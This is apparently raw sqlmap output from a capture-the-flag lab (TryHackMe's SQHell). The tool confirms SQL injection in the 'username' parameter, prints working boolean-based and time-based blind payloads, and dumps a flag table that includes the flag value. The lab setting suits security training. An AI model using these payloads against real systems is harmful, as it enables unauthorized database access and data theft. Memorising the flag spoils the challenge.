        ___
       __H__                                                                                                        
 ___ ___[(]_____ ___ ___  {1.7.8#stable}                                                                            
|_ -| . [(]     | .'| . |                                                                                           
|___|_  [)]_|_|_|__,|  _|                                                                                           
      |_|V...       |_|   https://sqlmap.org                                                                        

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 12:00:24 /2023-11-07/

[12:00:24] [INFO] parsing HTTP request from 'sqhell_register.request'
[12:00:24] [INFO] testing connection to the target URL
[12:00:25] [INFO] checking if the target is protected by some kind of WAF/IPS
[12:00:25] [INFO] testing if the target URL content is stable
[12:00:25] [INFO] target URL content is stable
[12:00:25] [INFO] testing if GET parameter 'username' is dynamic
[12:00:26] [INFO] GET parameter 'username' appears to be dynamic
[12:00:26] [WARNING] heuristic (basic) test shows that GET parameter 'username' might not be injectable
[12:00:26] [INFO] testing for SQL injection on GET parameter 'username'
[12:00:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[12:00:28] [INFO] GET parameter 'username' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[12:00:28] [INFO] testing 'Generic inline queries'
[12:00:28] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[12:00:28] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[12:00:28] [WARNING] time-based comparison requires larger statistical model, please wait.................... (done)
[12:00:47] [INFO] GET parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[12:01:03] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[12:01:03] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[12:01:03] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[12:01:05] [INFO] target URL appears to have 3 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] y
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[12:01:47] [INFO] target URL appears to be UNION injectable with 3 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] n
[12:01:58] [WARNING] if UNION based SQL injection is not detected, please consider usage of option '--union-char' (e.g. '--union-char=1') 
[12:01:58] [INFO] checking if the injection point on GET parameter 'username' is a false positive
GET parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 118 HTTP(s) requests:
---
Parameter: username (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=admin' AND 2881=2881 AND 'gvMM'='gvMM

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 9391 FROM (SELECT(SLEEP(5)))szgT) AND 'oWDx'='oWDx
---
[12:02:07] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12
[12:02:08] [INFO] fetching columns for table 'flag' in database 'sqhell_3'
[12:02:08] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[12:02:08] [INFO] retrieved: 2
[12:02:10] [INFO] retrieved: flag
[12:02:18] [INFO] retrieved: id
[12:02:23] [INFO] fetching entries for table 'flag' in database 'sqhell_3'
[12:02:23] [INFO] fetching number of entries for table 'flag' in database 'sqhell_3'
[12:02:23] [INFO] retrieved: 1
[12:02:25] [INFO] retrieved: THM{FLAG3:97AEB3B28A4864416718F3A5FAF8F308}
[12:04:03] [INFO] retrieved: 1
Database: sqhell_3
Table: flag
[1 entry]
+----+---------------------------------------------+
| id | flag                                        |
+----+---------------------------------------------+
| 1  | THM{FLAG3:97AEB3B28A4864416718F3A5FAF8F308} |
+----+---------------------------------------------+

